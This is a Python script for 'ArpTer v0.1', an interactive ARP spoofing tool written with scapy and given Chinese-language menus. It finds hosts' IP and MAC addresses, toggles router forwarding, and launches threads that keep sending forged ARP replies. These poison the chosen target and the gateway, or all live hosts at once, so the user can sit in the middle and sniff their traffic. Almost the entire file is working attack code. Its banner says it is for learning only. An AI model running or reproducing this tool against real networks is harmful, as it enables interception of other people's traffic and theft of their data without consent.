from scapy.all import *
import cj.Getmac
import cj.lyzf
import threading
import re

pd = True

def biaoti():
	xinxi = """
-------------------------------------
    _             _____             +
   / \\   _ __ _ _|_   _|__ _ __     +
  //_\\\\ | '__| '_ \\| |/ _ \\ '__|    +
 / ___ \\| |  | |_) | |  __/ |       +
/_/   \\_\\_|  | .__/|_|\\___|_|       +
             |_|                    +
   ++++++ArpTer v0.1++++++          +
 ==By:F_Dao 仅供学习_违法后果自负== +
-------------------------------------
	"""
	print(xinxi)


def xuanxiang():
	print("===================选项=================")
	xinxi = "[0]=查看mac表=\n"
	xinxi +="[1]=获取IP与mac=\n"
	xinxi +="[2]=开启或关闭路由转发=\n"
	xinxi +="[3]=嗅探单个目标=\n"
	xinxi +="[4]=嗅探全部目标=\n"
	xinxi +="[5]=查看当前嗅探目标=\n"
	xinxi +="[6]=停止所有嗅探状态=\n"
	xinxi +="\n[exit]=结束=\n"
	print(xinxi)

	xuanx = input("选项>").strip()
	return xuanx

def mac(zd):
	print("===============MAC表===============\n")
	if len(zd) == 0:
		print("\n\t\t空\n")
	else:
		jishu = 0
		for x,y in zd.items():
			print("["+str(jishu)+"]"+"IP:"+x+"-------->"+"Mac:"+y)
			jishu += 1
	print("\n===================================\n")

def poison(targetIP,gatewayIP,targetMAC,gatewayMAC,ifname,lmac):
	print("=============开始嗅探:"+targetIP+"=============")
	global pd
	if targetMAC and gatewayMAC:
		while pd:
			#对目标主机进行毒化
			sendp(Ether(src=lmac,dst=targetMAC)/ARP(hwsrc=lmac,hwdst=targetMAC,psrc=gatewayIP,pdst=targetIP,op=2),iface=ifname,verbose=False)

			#对目标主机进行毒化
			sendp(Ether(src=lmac,dst=gatewayMAC)/ARP(hwsrc=lmac,hwdst=gatewayMAC,psrc=targetIP,pdst=gatewayIP,op=2),iface=ifname,verbose=False)
			time.sleep(1)
	else:
		print("目标主机或网关IP有误，请检查！")

def ckxt(zidian):
	print("=============当前嗅探=============")
	if len(zidian) == 0:
		print("\n\t\t空\n")
	else:
		for x,y in zidian.items():
			print("IP:"+x+"<=============>"+"IP:"+y)
	print("=================================")


def main():
	biaoti()
	liveHost = {}
	lyzt = False
	global pd
	xtmb = {}
	while True:
		print('=============================')
		wangka = input("请输入监听网卡名称:").strip()
		try:
			lmac = get_if_hwaddr(wangka)
		except ValueError:
			print('网卡错误,请重新选择.....')
			continue
		wgip = input("请输入网关IP：").strip()
		pdip = re.findall("^\d+?\.\d+?\.\d+?\.\d+?$",wgip)
		if pdip[0]:
			break
		else:
			print('网卡或IP错误，请重新输入....')
	while True:
		xx = xuanxiang()
		if xx == "exit":
			lyzt = True
			cj.lyzf.lyzf_main(lyzt)
			exit()
		if xx == "0":
			mac(liveHost)
		if xx == "1":
			liveHost = cj.Getmac.GetMac(wgip)
		if xx == "2":
			lyzt = cj.lyzf.lyzf_main(lyzt)
		if xx == "3":
			while True:
				mbip = input("请输入需要嗅探的目标IP：").strip()
				pdip = re.findall("^\d+?\.\d+?\.\d+?\.\d+?$",mbip)
				if pdip[0]:
					break
			pd = True
			targetMAC = liveHost[mbip]
			gatewayMAC = liveHost[wgip]
			t = threading.Thread(target=poison,args=(mbip,wgip,targetMAC,gatewayMAC,wangka,lmac))
			t.start()
			xtmb[wgip] = mbip
		if xx == "4":
			pd = True
			gatewayMAC = liveHost[wgip]
			benjip = input("请输入本机IP：").strip()
			for x,y in liveHost.items():
				if (x == wgip) or (x == benjip):
					continue
				else:
					t = threading.Thread(target=poison,args=(x,wgip,y,gatewayMAC,wangka,lmac))
					t.start()
					xtmb[wgip] = x
		if xx == "5":
			ckxt(xtmb)
		if xx == "6":
			pd = False
			xtmb = {}

if __name__ == "__main__":
	main()